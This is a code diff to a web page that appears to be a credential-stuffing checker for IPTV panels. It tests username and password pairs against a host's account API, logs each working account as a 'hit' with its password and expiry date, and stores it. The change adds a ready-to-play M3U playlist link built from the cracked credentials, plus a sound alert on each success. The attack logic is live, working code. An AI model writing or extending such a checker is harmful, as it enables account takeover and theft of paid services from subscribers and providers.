@@ -839,17 +839,30 @@
                         const res = await fetchWithCors(url, { cache: 'no-store' });
                         const data = await res.json();
                         
-                        if(data && data.user_info && (data.user_info.status === 'Active' || data.user_info.auth == 1)) {
-                            const exp = data.user_info.exp_date ? new Date(data.user_info.exp_date*1000).toLocaleDateString() : 'Ilimitado';
-                            const texto = `🔥 HIT ENCONTRADO 🔥\n🌐 Host: ${host}\n👤 Usuario: ${user}\n🔑 Pass: ${pass}\n⏳ Expira: ${exp}`;
-                            HITS[jobId].push({ user, pass, texto });
-                            countSpan.innerHTML = `Hits: <span class="yellow-hit">${HITS[jobId].length}</span>`;
-                            const div = document.createElement('div');
-                            div.className = 'hit-block';
-                            div.innerHTML = `<pre class="hit-content">${texto}</pre>`;
-                            hitsContainer.prepend(div);
-                            guardarHitEnBanco(texto, user, pass);
-                        }
+                               if(data && data.user_info && (data.user_info.status === 'Active' || data.user_info.auth == 1)) {
+                    
+                    // --- SONIDO ---
+                    if(document.getElementById('soundToggle').checked) {
+                        audioHit.play().catch(e => console.log("Sonido bloqueado"));
+                    }
+
+                    const exp = data.user_info.exp_date ? new Date(data.user_info.exp_date*1000).toLocaleDateString() : 'Ilimitado';
+                    
+                    // --- FORMATO M3U ---
+                    const m3uLink = `http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus`;
+                    const texto = `🔥 HIT ENCONTRADO 🔥\n🌐 Host: ${host}\n👤 Usuario: ${user}\n🔑 Pass: ${pass}\n⏳ Expira: ${exp}\n\n🔗 LISTA M3U:\n${m3uLink}`;
+                    
+                    HITS[jobId].push({ user, pass, texto });
+                    countSpan.innerHTML = `Hits: <span class="yellow-hit">${HITS[jobId].length}</span>`;
+                    
+                    const div = document.createElement('div');
+                    div.className = 'hit-block';
+                    // Se usa white-space: pre-wrap para que el link no se corte
+                    div.innerHTML = `<pre class="hit-content" style="white-space: pre-wrap; word-break: break-all;">${texto}</pre>`;
+                    hitsContainer.prepend(div);
+                    guardarHitEnBanco(texto, user, pass);
+                }
+
                     }catch(_){}
                     finally {
                         processed++;
@@ -898,6 +911,9 @@
         });
 
         stopBtn.addEventListener('click', () => stopRequested = true);
+// Variable para el sonido
+const audioHit = new Audio('https://actions.google.com/sounds/v1/notifications/beep_short.ogg');
+
     </script>
 </body>
 </html>
